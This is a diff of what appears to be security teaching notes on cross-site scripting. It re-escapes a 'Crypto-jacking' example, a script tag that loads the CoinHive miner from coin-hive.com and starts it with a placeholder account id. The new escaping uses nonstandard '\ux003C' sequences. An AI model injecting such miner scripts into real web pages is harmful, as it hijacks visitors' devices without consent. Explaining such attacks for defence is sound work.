@@ -514,14 +514,14 @@ stream = await navigator.mediaDevices.getUserMedia(constraints);
 
 
 Crypto-jacking:
-```html
-&#x003C;script src="https://coin-hive.com/lib/coinhive.min.js"&#x003E;&#x003C;/script&#x003E;
-&#x003C;script&#x003E;
-  var miner = new CoinHive.Anonymous('&#x003C;my account id&#x003C;');
+```javascript
+\ux003Cscript src="https://coin-hive.com/lib/coinhive.min.js" \ux003E \ux003C /script \ux003E
+\ux003Cscript\ux003E
+  var miner = new CoinHive.Anonymous('[my account id]');
   miner.start();
-&#x003C;/script&#x003E;
+\ux003C/script\ux003E
 ```
-
+ 
 --
 
 ## Cross-Site Scripting (XSS): defense
